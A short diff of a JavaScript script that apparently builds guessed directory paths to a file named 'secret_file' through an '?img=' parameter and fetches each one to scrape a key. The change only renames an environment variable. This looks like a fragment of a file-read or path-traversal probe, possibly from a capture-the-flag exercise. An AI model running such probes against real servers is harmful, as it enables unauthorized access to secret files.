@@ -18,7 +18,7 @@ const dirs = [
 ];
 
 const expectedFileName = "secret_file";
-const dirsGuess = dirs.map(dir => `${process.env.URL}?img=${requireDir}${dir}${expectedFileName}`);
+const dirsGuess = dirs.map(dir => `${process.env.ANYA_URL}?img=${requireDir}${dir}${expectedFileName}`);
 
 async function scrapingKey(url) {
   const response = await axios.get(url);
